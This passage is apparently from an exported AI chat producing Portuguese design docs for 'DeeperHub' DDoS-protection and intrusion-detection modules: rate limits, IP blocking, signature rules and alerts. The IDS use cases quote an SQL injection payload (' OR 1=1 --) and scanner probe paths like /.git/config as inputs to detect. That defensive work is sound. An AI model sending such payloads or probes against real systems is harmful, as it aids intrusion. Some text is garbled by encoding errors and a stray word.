*   **Adaptabilidade:** Limiares e regras devem ser ajust√°veis, possivelmente dinamicamente com base na carga observada ou em alertas.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **HTTP GET Flood em `/search`:**
    *   Muitos IPs (ou um s√≥) enviam um grande volume de GETs para `/search`.
    *   `DdosProtectionPlug` registra cada requisi√ß√£o.
    *   `DdosProtectionService` detecta que o limite de taxa para o path `/search` (ou para os IPs individuais) foi excedido.
    *   Os IPs atacantes s√£o enviados para `IPFirewallService.block_ip/3`.
    *   O sistema pode entrar em \"modo avan√ßado\", aplicando um desafio CAPTCHA para todas as requisi√ß√µes a `/search` de IPs n√£o autenticados ou novos.
*   **Ataque de Login Distribu√≠do (Credential Stuffing):**
    *   Muitos IPs diferentes tentam fazer login com credenciais variadas.
    *   `DdosProtectionService` pode n√£o detectar por IP individual, mas o `PatternAnalyzer` (analisando logs de `BruteForceProtection` e tr√°fego de API) pode identificar um aumento anormal nas tentativas de login em geral.
    *   Isso pode disparar um alerta para `Security.Monitoring` ou ativar o modo de prote√ß√£o avan√ßada, que poderia impor um CAPTCHA global para login ou limites de taxa mais baixos por IP.
*   **Administrador Ativa Modo \"Sob Ataque\":**
    *   Monitoramento externo indica um ataque DDoS volum√©trico.
    *   Administrador usa `DeeperHub.Console` para chamar `DdosProtection.set_advanced_protection(true, opts)`.
    *   Todas as novas requisi√ß√µes de IPs n√£o reconhecidos passam por um desafio JavaScript ou s√£o servidas com conte√∫do est√°tico de \"estamos sob ataque\", enquanto IPs conhecidos/autenticados podem ter acesso limitado.

## üåä 5. Fluxos Importantes

### Fluxo de Mitiga√ß√£o de HTTP Flood por IP √önico

1.  **Requisi√ß√µes Maliciosas:** Um IP (`1.2.3.4`) come√ßa a enviar centenas de requisi√ß√µes por segundo para `/api/v1/data`.
2.  **`DdosProtectionPlug`:**
    *   Para cada requisi√ß√£o, chama `DdosProtectionService.record_and_check_request(\"1.2.3.4\", \"/api/v1/data\", context)`.
3.  **`DdosProtectionService`:**
    *   Incrementa o contador de requisi√ß√µes para `ip:1.2.3.4` e para `path:/api/v1/data`.
    *   Verifica se o contador para `ip:1.2.3.4` excedeu o limiar (ex: 100 reqs/minuto).
    *   **Limite Excedido:**
        *   Loga o evento.
        *   Incrementa m√©trica `ddos.ip_rate_limited`.
        *   Chama `DeeperHub.Security.IPFirewallService.block_ip(\"1.2.3.4\", \"DDoS rate limit exceeded on /api/v1/data\", 3600)`.
        *   Retorna `{:block, :ip_rate_limit_exceeded}` para o Plug.
4.  **`DdosProtectionPlug`:** Ao receber `{:block, ...}`, instrui a `conn` a retornar um `429 Too Many Requests` ou `403 Forbidden`.
5.  **Requisi√ß√µes Subsequentes de `1.2.3.4`:** Ser√£o bloqueadas mais cedo pelo `IPFirewallPlug`.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada)

### 6.1. `DeeperHub.Security.DdosProtection.check_request_permitted?(ip_address :: String.t(), path :: String.t(), context :: map()) :: boolean()` (Nova Sugest√£o)

*   **Descri√ß√£o:** Verifica se uma requisi√ß√£o deve ser permitida com base nas pol√≠ticas de DDoS atuais. Retorna `true` se permitida, `false` se deve ser bloqueada ou limitada por taxa. Usado pelo Plug.
*   **`context`:** `%{method: \"GET\", headers: %{...}}`.

### 6.2. `DeeperHub.Security.DdosProtection.record_request_data(ip_address :: String.t(), path :: String.t(), context :: map(), response_status_code :: integer()) :: :ok` (Nova Sugest√£o)

*   **Descri√ß√£o:** Registra dados sobre uma requisi√ß√£o processada para an√°lise de padr√µes e para a mec√¢nica de rate limiting. Chamado pelo Plug *ap√≥s* a requisi√ß√£o ser processada pelo controller (para ter o status code).

### 6.3. `DeeperHub.Security.DdosProtection.report_suspicious_ip(ip_address :: String.t(), reason :: String.t(), evidence :: map() | nil) :: :ok`

*   **Descri√ß√£o:** Permite que outros m√≥dulos (ex: `FraudDetection`, `IntrusionDetection`) reportem um IP como suspeito de atividade DDoS, podendo levar ao seu bloqueio.

### 6.4. `DeeperHub.Security.DdosProtection.set_protection_level(level :: :normal | :high_alert | :under_attack, opts :: keyword()) :: :ok` (Renomeado de `set_advanced_protection`)

*   **Descri√ß√£o:** Define o n√≠vel de prote√ß√£o global do sistema.
*   **`opts`:** Configura√ß√µes espec√≠ficas para o n√≠vel (ex: para `:under_attack`, `%{challenge_type: :js_challenge, global_ip_rate_limit: 5}`).

### 6.5. `DeeperHub.Security.DdosProtection.get_current_protection_level() :: {:ok, %{level: atom(), active_policies: map()}}` (Nova Sugest√£o)

*   **Descri√ß√£o:** Retorna o n√≠vel de prote√ß√£o atual e as pol√≠ticas ativas.

### 6.6. `DeeperHub.Security.DdosProtection.get_traffic_statistics(opts :: keyword()) :: {:ok, map()}` (Renomeado de `get_statistics`)

*   **Descri√ß√£o:** Obt√©m estat√≠sticas de tr√°fego e mitiga√ß√£o.
*   **`opts`:** `:period` (`:last_minute`, `:last_hour`, `:last_day`), `:group_by` (`:ip`, `:path`).

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :ddos, :enabled]`** (Boolean): Habilita o m√≥dulo.
*   **`[:security, :ddos, :default_policies, :normal_level]`** (Map): Configs de rate limit para IPs, paths, etc., em modo normal.
    *   Ex: `%{global_ip_limit: %{requests: 1000, window_seconds: 60}, path_limits: %{\"/api/search\" => %{requests: 60, window_seconds: 60}}}`
*   **`[:security, :ddos, :default_policies, :high_alert_level]`** (Map): Configs mais restritivas.
*   **`[:security, :ddos, :default_policies, :under_attack_level]`** (Map): Configs muito restritivas, possivelmente com `challenge_type: :js_challenge | :captcha`.
*   **`[:security, :ddos, :ip_block_on_ddos, :duration_seconds]`** (Integer): Dura√ß√£o padr√£o de bloqueio para IPs envolvidos em DDoS.
*   **`[:security, :ddos, :pattern_analyzer, :enabled]`** (Boolean).
*   **`[:security, :ddos, :pattern_analyzer, :log_analysis_interval_minutes]`** (Integer).
*   **`[:security, :ddos, :notification_thresholds, :global_rps]`** (Integer): Limiar de RPS global para notificar admins.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.Logger`, `Core.Metrics`, `Core.EventBus`.
*   `DeeperHub.Security.IPFirewallService`: Para efetuar bloqueios de IP.
*   `DeeperHub.API.RateLimiterFacade`: Como um dos mecanismos para implementar os limites de taxa.
*   `DeeperHub.Security.Monitoring`: Para enviar alertas de DDoS.
*   `DeeperHub.Security.CaptchaService` (ou um servi√ßo de desafio gen√©rico): Se desafios forem usados.

### 8.2. Bibliotecas Externas

*   Nenhuma espec√≠fica para a l√≥gica central. Adaptadores para servi√ßos de mitiga√ß√£o externos teriam suas pr√≥prias depend√™ncias (ex: clientes HTTP).

## ü§ù 9. Como Usar / Integra√ß√£o

*   **`DdosProtectionPlug`:** Adicionar ao pipeline global do Phoenix Router, bem no in√≠cio.
    ```elixir
    pipeline :protect_all_the_things do
      plug DeeperHub.Security.Plugs.DdosProtectionPlug
      # ... outros plugs ...
    end
    scope \"/\", DeeperHubWeb do
      pipe_through [:browser, :protect_all_the_things] # ou apenas :protect_all_the_things
      # ...
    end
    ```
*   **Alertas de Monitoramento Externo:** Um sistema de monitoramento externo pode chamar uma API administrativa (protegida) que por sua vez chama `DdosProtection.set_protection_level(:under_attack, ...)` se um ataque massivo for detectado na borda da rede.

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Simular diferentes cen√°rios de flood HTTP (single IP, multi IP, path espec√≠fico) e verificar se o `DdosProtectionPlug` e o `DdosProtectionService` aplicam rate limiting e bloqueios corretamente.
*   Testar a transi√ß√£o entre diferentes n√≠veis de prote√ß√£o e se as pol√≠ticas correspondentes s√£o aplicadas.
*   Testar a l√≥gica do `PatternAnalyzer` com logs de tr√°fego simulados.
*   Localiza√ß√£o: `test/deeper_hub/security/ddos_protection/`.

### 10.2. M√©tricas

*   `deeper_hub.security.ddos.requests.total` (Contador, tags: `path`, `ip_country` (se dispon√≠vel))
*   `deeper_hub.security.ddos.requests.rate_limited.count` (Contador, tags: `path`, `ip_address_masked`)
*   `deeper_hub.security.ddos.requests.blocked_by_ddos.count` (Contador, tags: `path`, `ip_address_masked`)
*   `deeper_hub.security.ddos.protection_level.gauge` (Gauge, valor: 0=normal, 1=high_alert, 2=under_attack)
*   `deeper_hub.security.ddos.active_ip_blocks_ddos.gauge` (Gauge)

### 10.3. Logs

*   **N√≠vel INFO:** Mudan√ßa no n√≠vel de prote√ß√£o.
*   **N√≠vel WARNING:** IP sendo limitado por taxa devido a pol√≠tica de DDoS. IP bloqueado por pol√≠tica de DDoS. Padr√£o de ataque suspeito detectado pelo `PatternAnalyzer`.
*   **N√≠vel ERROR:** Falha ao aplicar uma pol√≠tica de bloqueio.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :ddos, :request_analysis]`
    *   Metadados: `%{ip: ip, path: path, user_agent_ kr√≥tkie, result: :allowed | :rate_limited | :blocked, current_rps: rps}`
*   `[:deeper_hub, :security, :ddos, :ip_action_ddos]`
    *   Metadados: `%{ip: ip, action: :blocked | :unblocked_ddos, reason: reason, duration: dur}`
*   `[:deeper_hub, :security, :ddos, :protection_level_change]`
    *   Metadados: `%{old_level: level, new_level: level, trigger: :manual | :automatic}`

## ‚ùå 11. Tratamento de Erros

*   Falhas nos componentes de prote√ß√£o DDoS (ex: ETS cheio, erro no `PatternAnalyzer`) n√£o devem derrubar a aplica√ß√£o. O sistema deve tentar operar em um modo seguro ou degradado.
*   Erros ao bloquear um IP via `IPFirewallService` devem ser logados, mas o rate limiting ainda deve funcionar se poss√≠vel.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa (do pr√≥prio M√≥dulo)

*   **Falsos Positivos:** A principal preocupa√ß√£o. Limites muito baixos ou detec√ß√£o de padr√µes muito sens√≠vel podem bloquear tr√°fego leg√≠timo. A capacidade de ajustar pol√≠ticas e ter um modo \"monitor\" √© importante.
*   **Bypass:** Atacantes podem tentar contornar a prote√ß√£o baseada em IP usando proxies ou botnets grandes. A an√°lise de padr√µes e a integra√ß√£o com `DeviceFingerprint` ou `BehavioralAnalysis` podem ajudar.
*   **Recursos do Pr√≥prio M√≥dulo:** O monitoramento de tr√°fego e a manuten√ß√£o de contadores podem consumir recursos. Otimizar o uso de ETS e amostrar dados para o `PatternAnalyzer` √© importante.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Novas regras de detec√ß√£o de padr√µes devem ser adicionadas ao `PatternAnalyzer` com testes rigorosos.
*   Ao integrar com servi√ßos externos de mitiga√ß√£o, crie adaptadores claros e resilientes.
*   Pol√≠ticas de rate limiting devem ser revisadas e ajustadas com base no tr√°fego observado e no perfil de risco da aplica√ß√£o.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar desafios JavaScript mais leves antes de recorrer a CAPTCHAs completos para tr√°fego suspeito, mas n√£o claramente malicioso.
*   [ ] Desenvolver um sistema de \"aprendizado\" para os limiares de rate limiting, permitindo que se ajustem dinamicamente √† carga normal da aplica√ß√£o.
*   [ ] Integra√ß√£o mais profunda com WAFs na borda para bloquear tr√°fego no n√≠vel da infraestrutura com base nas detec√ß√µes da aplica√ß√£o.
*   [ ] An√°lise de \"fingerprints de bot\" para identificar e bloquear tr√°fego automatizado malicioso de forma mais eficaz.
*   [ ] Permitir que usu√°rios (especialmente clientes de API) solicitem aumento de limites de taxa mediante justificativa ou plano de assinatura.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Prote√ß√£o DDoS √© uma batalha cont√≠nua!

Agora que cobrimos v√°rias camadas de seguran√ßa (`AdminAuth`, `CsrfProtection`, `SqlInjectionProtection`, `PathTraversalProtection`, `DdosProtection`), e tamb√©m m√≥dulos Core (`EventBus`, `ConfigManager`, `Logger`, `Metrics`, `Cache`, `Repo`), talvez seja uma boa hora para um m√≥dulo de dom√≠nio, como `DeeperHub.Servers` ou `DeeperHub.Accounts` (que j√° come√ßamos)? Ou prefere continuar com os m√≥dulos de seguran√ßa restantes, como `AtRestEncryptionService` ou `ResponseSanitizer`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Entendido! Vamos continuar com os m√≥dulos de seguran√ßa, pois s√£o a espinha dorsal da prote√ß√£o do sistema.

Dado que j√° abordamos `AtRestEncryptionService` de forma impl√≠cita ao falar do `Core.EncryptionService` e `EncryptedType`, e `ResponseSanitizer` √© conceitualmente similar ao `LogSanitizer` (focado em respostas HTTP), que tal detalharmos o `DeeperHub.Security.IntrusionDetection`? Este m√≥dulo atua como um sistema de alerta para atividades suspeitas que podem n√£o ser fraude direta, mas indicam uma poss√≠vel tentativa de comprometer o sistema.

---

# M√≥dulo: `DeeperHub.Security.IntrusionDetection` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Security.IntrusionDetection`

O m√≥dulo `DeeperHub.Security.IntrusionDetection` (IDS) funciona como um sistema de vigil√¢ncia para o DeeperHub, monitorando atividades e eventos em busca de padr√µes que possam indicar uma tentativa de intrus√£o ou explora√ß√£o de vulnerabilidades. Diferente da detec√ß√£o de fraude (que foca em abuso de funcionalidades leg√≠timas para ganho il√≠cito) ou da prote√ß√£o contra for√ßa bruta (que foca em adivinha√ß√£o de credenciais), o IDS procura por sinais de reconhecimento, explora√ß√£o de falhas de seguran√ßa conhecidas, ou comportamento an√¥malo que sugira um ator malicioso tentando obter acesso n√£o autorizado ou escalar privil√©gios.

Ele analisa logs, eventos de rede (se aplic√°vel no n√≠vel da aplica√ß√£o), e atividades de usu√°rio, comparando-os com um conjunto de regras, assinaturas de ataques conhecidos e, potencialmente, com desvios de comportamento normal estabelecido. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Monitoramento de Atividades (`record_activity/2`):**
    *   Receber e registrar eventos de diversas fontes do sistema (logs de aplica√ß√£o, eventos de autentica√ß√£o, acesso a arquivos, chamadas de API, etc.) para an√°lise.
*   **Detec√ß√£o Baseada em Assinaturas/Regras (`analyze_activity/2`):**
    *   Comparar atividades com um conjunto de regras e assinaturas de ataques conhecidos (ex: tentativas de SQL Injection, XSS, Path Traversal, varredura de diret√≥rios, uso de comandos suspeitos em entradas).
    *   Identificar o uso de ferramentas de hacking comuns atrav√©s de padr√µes em User-Agents ou par√¢metros.
*   **Detec√ß√£o Baseada em Anomalias (Integra√ß√£o):**
    *   Integrar-se com `DeeperHub.Security.BehavioralAnalysis` para identificar desvios significativos do comportamento normal de um usu√°rio que possam indicar comprometimento de conta.
    *   Monitorar sequ√™ncias de a√ß√µes incomuns.
*   **An√°lise de Logs:**
    *   Processar logs da aplica√ß√£o e do sistema (se acess√≠veis) para encontrar padr√µes suspeitos ou mensagens de erro indicativas de uma tentativa de explora√ß√£o.
*   **Gerenciamento de Alertas de Intrus√£o (`get_alerts/1`, `generate_alert` via `Security.Monitoring`):**
    *   Gerar alertas quando uma atividade suspeita ou uma intrus√£o potencial √© detectada.
    *   Classificar alertas por severidade (baixo, m√©dio, alto, cr√≠tico).
*   **Resposta a Incidentes (Limitada/Coordenada):**
    *   Tomar a√ß√µes de resposta configur√°veis (ex: bloquear IP via `IPFirewallService`, invalidar sess√£o do usu√°rio via `Auth.SessionManager`, notificar administradores via `Security.Monitoring`).
    *   Fornecer informa√ß√µes detalhadas para auxiliar na investiga√ß√£o manual de incidentes.
*   **Configura√ß√£o de Regras e Assinaturas (`configure_rules/1`):**
    *   Permitir a atualiza√ß√£o e customiza√ß√£o do conjunto de regras e assinaturas de detec√ß√£o.
*   **Relat√≥rios e Estat√≠sticas (`get_statistics/1`):**
    *   Fornecer dados sobre intrus√µes detectadas, tipos de ataque, fontes, etc.
*   **Verifica√ß√£o de Reputa√ß√£o (IP/Usu√°rio) (`check_ip/1`, `check_user/1`):**
    *   Manter um hist√≥rico de atividades suspeitas por IP ou usu√°rio para auxiliar na avalia√ß√£o de risco cont√≠nua.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.IntrusionDetection` (Fachada P√∫blica):**
    *   Ponto de entrada para registrar atividades e consultar o status do IDS.
    *   Delega para o `IntrusionDetectionService`.
2.  **`DeeperHub.Security.IntrusionDetection.Services.IntrusionDetectionService` (GenServer):**
    *   **Responsabilidade:** Processo central que recebe eventos de atividade, aplica regras de detec√ß√£o, gerencia o estado das amea√ßas percebidas e coordena respostas.
    *   **Estado Interno:**
        *   Conjunto de regras/assinaturas ativas.
        *   Contadores de atividades suspeitas por IP/usu√°rio/tipo de ataque.
        *   Estado de alertas ativos.
    *   **Intera√ß√µes:**
        *   `RuleEngine`: Para aplicar regras de detec√ß√£o.
        *   `AnomalyDetector` (pode ser parte de `BehavioralAnalysis`): Para detec√ß√£o baseada em anomalias.
        *   `DeeperHub.Security.IPFirewallService`: Para bloquear IPs.
        *   `DeeperHub.Auth.SessionManager`: Para invalidar sess√µes.
        *   `DeeperHub.Security.Monitoring`: Para gerar alertas.
        *   `DeeperHub.Audit`: Para registrar intrus√µes e a√ß√µes.
        *   `DeeperHub.Core.ConfigManager` / `SecurityPolicyManager`: Para obter regras e configura√ß√µes.
3.  **`DeeperHub.Security.IntrusionDetection.RuleEngine` (M√≥dulo Funcional):**
    *   **Responsabilidade:** Aplicar o conjunto de regras e assinaturas aos eventos de atividade recebidos.
    *   Pode usar regex, correspond√™ncia de padr√µes, ou l√≥gica mais complexa.
4.  **`DeeperHub.Security.IntrusionDetection.SignatureDatabase` (M√≥dulo/ETS/Arquivo):**
    *   **Responsabilidade:** Armazenar as assinaturas de ataques conhecidos e regras de detec√ß√£o. Pode ser atualiz√°vel.
5.  **Fontes de Eventos (M√≥dulos da Aplica√ß√£o):**
    *   Diversos m√≥dulos (`API`, `Auth`, `FileHandler`, etc.) enviam eventos de atividade para o `IntrusionDetectionService` atrav√©s de `record_activity/2`.
6.  **`DeeperHub.Security.IntrusionDetection.Supervisor`:**
    *   Supervisiona o `IntrusionDetectionService` e quaisquer workers associados.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/security/intrusion_detection/
‚îú‚îÄ‚îÄ intrusion_detection.ex            # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îî‚îÄ‚îÄ intrusion_detection_service.ex # GenServer principal
‚îÇ
‚îú‚îÄ‚îÄ rule_engine.ex                    # L√≥gica de aplica√ß√£o de regras
‚îú‚îÄ‚îÄ signature_database.ex             # M√≥dulo para acesso a assinaturas/regras
‚îÇ
‚îú‚îÄ‚îÄ rules/                            # (Opcional) Onde defini√ß√µes de regras podem ser armazenadas
‚îÇ   ‚îî‚îÄ‚îÄ sql_injection_signatures.exs
‚îÇ
‚îú‚îÄ‚îÄ supervisor.ex
‚îî‚îÄ‚îÄ telemetry.ex
```
*(O `IntrusionDetectionAdapter` e `IntrusionDetectionBehaviour` da documenta√ß√£o original s√£o consolidados aqui.)*

### 3.3. Decis√µes de Design Importantes

*   **Performance:** A an√°lise de atividades deve ser eficiente para n√£o sobrecarregar o sistema, especialmente se for s√≠ncrona em alguns pontos. Muitas an√°lises podem ser ass√≠ncronas.
*   **Taxa de Falsos Positivos/Negativos:** Balancear a sensibilidade para detectar amea√ßas reais sem gerar um volume excessivo de falsos alertas √© crucial.
*   **Atualiza√ß√£o de Regras/Assinaturas:** O sistema deve permitir a f√°cil atualiza√ß√£o do conjunto de regras e assinaturas para se adaptar a novas amea√ßas.
*   **Resposta Automatizada vs. Manual:** Definir claramente quais tipos de detec√ß√£o justificam uma resposta automatizada (ex: bloqueio de IP) versus aquelas que requerem an√°lise manual.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Detec√ß√£o de Tentativa de SQL Injection na API:**
    *   O `DeeperHub.API` (ou um plug de valida√ß√£o) envia um par√¢metro de requisi√ß√£o suspeito para `IntrusionDetection.record_activity(%{type: :api_param, value: \" ' OR 1=1 --\", ...}, context)`.
    *   `IntrusionDetectionService` usa `RuleEngine` que identifica a assinatura de SQLi.
    *   Uma intrus√£o √© registrada, um alerta √© gerado para `Security.Monitoring`, e o IP pode ser enviado para `IPFirewallService` para bloqueio.
*   **M√∫ltiplas Tentativas de Acesso a Arquivos Inexistentes (Varredura):**
    *   Um m√≥dulo que serve arquivos registra m√∫ltiplas tentativas falhas de acesso (404s) de um mesmo IP para caminhos que n√£o existem, mas que parecem ser tentativas de encontrar vulnerabilidades (ex: `/.git/config`, `/admin.php`).
    *   Essas atividades s√£o enviadas para `IntrusionDetection.record_activity/2`.
    *   `RuleEngine` ou `PatternAnalyzer` (dentro do `IntrusionDetectionService`) detecta o padr√£o de varredura.
    *   O IP √© bloqueado e um alerta √© gerado.
*   **Comportamento An√¥malo de Usu√°rio Ap√≥s Login:**
    *   `BehavioralAnalysis` detecta um desvio significativo no comportamento de um usu√°rio rec√©m-logado.
    *   `BehavioralAnalysis` envia um evento de \"alta anomalia comportamental\" para o `IntrusionDetectionService`.
    *   `IntrusionDetectionService` pode correlacionar isso com outros fatores (ex: login de IP novo) e escalar para um alerta de poss√≠vel comprometimento de conta, sugerindo a invalida√ß√£o da sess√£o.

## üåä 5. Fluxos Importantes

### Fluxo de An√°lise de Atividade Suspeita

1.  **Registro de Atividade:** Um m√≥dulo da aplica√ß√£o (ex: um plug de firewall de aplica√ß√£o web no n√≠vel da API) observa uma atividade (ex: uma requisi√ß√£o HTTP com par√¢metros suspeitos) e chama `DeeperHub.Security.IntrusionDetection.record_activity(activity_details, context)`.
2.  **`IntrusionDetectionService` (GenServer):**
    *   Recebe a atividade.
    *   (Opcional) Persiste a atividade bruta para an√°lise forense ou em lote.
    *   Envia a atividade para o `RuleEngine`.
3.  **`RuleEngine`:**
    *   Compara a atividade com o conjunto de regras e assinaturas carregadas da `SignatureDatabase`.
    *   **Regra Acionada:** Se uma ou mais regras/assinaturas corresponderem (ex: padr√£o de SQLi encontrado):
        *   Retorna os detalhes da(s) regra(s) acionada(s) e uma severidade associada para o `IntrusionDetectionService`.
    *   **Nenhuma Regra Acionada:** Retorna que nenhuma amea√ßa baseada em assinatura foi encontrada.
4.  **`IntrusionDetectionService` (Continua√ß√£o):**
    *   **Se Amea√ßa Detectada:**
        *   Registra a intrus√£o (`record_intrusion/2`).
        *   Gera um alerta para `DeeperHub.Security.Monitoring` com a severidade e detalhes.
        *   Com base na severidade e na pol√≠tica configurada, toma a√ß√µes de resposta:
            *   Chama `DeeperHub.Security.IPFirewallService.block_ip(...)`.
            *   Chama `DeeperHub.Auth.SessionManager.invalidate_session_for_user(...)`.
    *   (Opcional) Se nenhuma amea√ßa baseada em assinatura, mas a atividade for de um tipo que `BehavioralAnalysis` monitora, pode encaminhar para l√°.
5.  **Resposta (Ass√≠ncrona):** A fun√ß√£o `record_activity` geralmente retorna `:ok` rapidamente para n√£o bloquear o chamador. As an√°lises e respostas s√£o tratadas em background.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada)

### 6.1. `DeeperHub.Security.IntrusionDetection.record_activity(activity_data :: map(), context :: map() | nil) :: :ok`

*   **Descri√ß√£o:** Registra uma atividade do sistema para an√°lise pelo IDS. Esta √© a principal forma de alimentar o IDS com dados.
*   **`activity_data`:** Mapa descrevendo a atividade. Deve incluir:
    *   `:type` (atom): Tipo de atividade (ex: `:http_request`, `:api_call`, `:file_access_attempt`, `:auth_attempt`).
    *   `:source_ip` (String.t | nil).
    *   `:user_id` (String.t | nil).
    *   `:timestamp` (DateTime.t).
    *   Outros campos espec√≠ficos do tipo (ex: para `:http_request`, `%{path: \"/\", params: %{...}, headers: %{...}}`).
*   **`context`:** Metadados adicionais.

### 6.2. `DeeperHub.Security.IntrusionDetection.analyze_activity(activity_data :: map(), context :: map() | nil) :: {:ok, :normal | :suspicious | :intrusion_detected, details :: map() | nil}`

*   **Descri√ß√£o:** Realiza uma an√°lise s√≠ncrona de uma atividade espec√≠fica. Usado quando uma decis√£o imediata √© necess√°ria.
*   **Retorno:** O n√≠vel de amea√ßa percebido e detalhes (ex: regras acionadas).

### 6.3. `DeeperHub.Security.IntrusionDetection.check_ip_reputation(ip_address :: String.t()) :: {:ok, %{risk_score: float(), known_threats: list(atom())}}` (Nova Sugest√£o)

*   **Descri√ß√£o:** Consulta a base de dados interna do IDS (e potencialmente feeds externos) sobre a reputa√ß√£o de um IP.
*   **Retorno:** Score de risco e amea√ßas conhecidas associadas ao IP.

### 6.4. `DeeperHub.Security.IntrusionDetection.get_alerts(opts :: keyword()) :: {:ok, list(Alert.t())}`

*   **Descri√ß√£o:** Lista os alertas de intrus√£o ativos ou recentes.
*   **`opts`:** `:severity_threshold` (atom), `:since` (DateTime.t), `:limit`.
*   **`Alert.t()`:** `%{id: String.t(), timestamp: DateTime.t(), type: atom(), severity: atom(), source_ip: String.t(), user_id: String.t(), description: String.t(), details: map(), status: :new | :acknowledged | :resolved}`.

### 6.5. `DeeperHub.Security.IntrusionDetection.configure_rules(rules_list :: list(map())) :: :ok | {:error, term()}`

*   **Descri√ß√£o:** Atualiza ou substitui o conjunto de regras de detec√ß√£o. Requer permiss√£o de administrador.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :intrusion_detection, :enabled]`** (Boolean): Habilita/desabilita o IDS. (Padr√£o: `true`)
*   **`[:security, :intrusion_detection, :rules_source]`** (String | Module): Fonte das regras/assinaturas (ex: path de arquivo, m√≥dulo Elixir, tabela de DB).
*   **`[:security, :intrusion_detection, :default_action_on_detection, <severity>]`** (Map): A√ß√£o padr√£o para cada n√≠vel de severidade de intrus√£o.
    *   Ex: `%{critical: [:block_ip_permanent, :invalidate_session, :alert_admin_urgent], high: [:block_ip_temporary, :alert_admin]}`
*   **`[:security, :intrusion_detection, :ip_block_duration_on_intrusion_seconds]`** (Integer): Dura√ß√£o padr√£o para bloqueios de IP por intrus√£o.
*   **`[:security, :intrusion_detection, :event_log_retention_days]`** (Integer): Reten√ß√£o para logs de atividade bruta.
*   **`[:security, :intrusion_detection, :alert_aggregation_window_seconds]`** (Integer): Janela para agregar m√∫ltiplos alertas similares em um √∫nico.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.Logger`, `Core.Metrics`, `Core.EventBus`.
*   `DeeperHub.Security.IPFirewallService`: Para bloquear IPs.
*   `DeeperHub.Auth.SessionManager`: Para invalidar sess√µes.
*   `DeeperHub.Security.Monitoring`: Para gerar e encaminhar alertas.
*   `DeeperHub.Audit`: Para registrar intrus√µes confirmadas.
*   `DeeperHub.Security.BehavioralAnalysis`: Como uma fonte de eventos de anomalia.
*   `DeeperHub.Security.SqlInjectionProtection`, `XssProtection`, `PathTraversalProtection`: Podem alimentar o IDS com suas detec√ß√µes.

### 8.2. Bibliotecas Externas

*   Bibliotecas de parsing de logs (se aplic√°vel).
*   Bibliotecas para an√°lise de padr√µes ou regex avan√ßado.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Plugs de Seguran√ßa:** Plugs no pipeline Phoenix podem chamar `IntrusionDetection.record_activity/2` com detalhes da requisi√ß√£o.
    ```elixir
    # Exemplo de Plug
    def call(conn, _opts) do
      activity = %{
        type: :http_request,
        source_ip: inspect(conn.remote_ip),
        path: conn.request_path,
        method: conn.method,
        headers: conn.req_headers,
        params: conn.params # Cuidado com dados sens√≠veis aqui! Sanitize antes.
      }
      user_id = conn.assigns.current_user_id # Se j√° autenticado
      context = %{user_id: user_id, session_id: Plug.Conn.get_session(conn, :session_id)}
      DeeperHub.Security.IntrusionDetection.record_activity(activity, context)
      conn
    end
    ```
*   **M√≥dulos de Servi√ßo:** Qualquer servi√ßo que lide com opera√ß√µes sens√≠veis ou entradas do usu√°rio deve registrar atividades relevantes.
    *   Ex: `DeeperHub.Accounts` pode registrar `:auth_attempt_failed`.
    *   Servi√ßos de upload de arquivos podem registrar `:file_access_attempt`.

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar o `RuleEngine` com v√°rias atividades e verificar se as regras corretas s√£o acionadas.
*   Simular sequ√™ncias de atividades que deveriam disparar uma detec√ß√£o de padr√£o.
*   Testar as a√ß√µes de resposta (bloqueio de IP, invalida√ß√£o de sess√£o) com mocks.
*   Verificar se os alertas s√£o gerados corretamente.
*   Localiza√ß√£o: `test/deeper_hub/security/intrusion_detection/`.

### 10.2. M√©tricas

*   `deeper_hub.security.ids.activities_recorded.count` (tags: `activity_type`)
*   `deeper_hub.security.ids.intrusions_detected.count` (tags: `rule_id`, `severity`, `source_ip_masked`)
*   `deeper_hub.security.ids.alerts_generated.count` (tags: `severity`)
*   `deeper_hub.security.ids.actions_taken.count` (tags: `action_type` (`block_ip`, `invalidate_session`))
*   `deeper_hub.security.ids.rule_engine.processing_time_ms` (Histograma)

### 10.3. Logs

*   **N√≠vel INFO:** Atividades normais sendo processadas (se em modo de depura√ß√£o verboso).
*   **N√≠vel WARNING:** Atividade suspeita detectada que acionou uma regra de baixa/m√©dia severidade.
*   **N√≠vel ERROR/CRITICAL:** Intrus√£o de alta/cr√≠tica severidade detectada. A√ß√£o de bloqueio executada. Falha no pr√≥prio servi√ßo IDS.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :ids, :activity_analyzed]`
    *   Metadados: `%{activity_type: type, source_ip: ip, user_id: id, rules_triggered: list_of_rule_ids, detection_severity: severity}`
*   `[:deeper_hub, :security, :ids, :response_action_taken]`
    *   Metadados: `%{action: type, target_ip: ip, target_user_id: id, rule_id: id, severity: severity}`

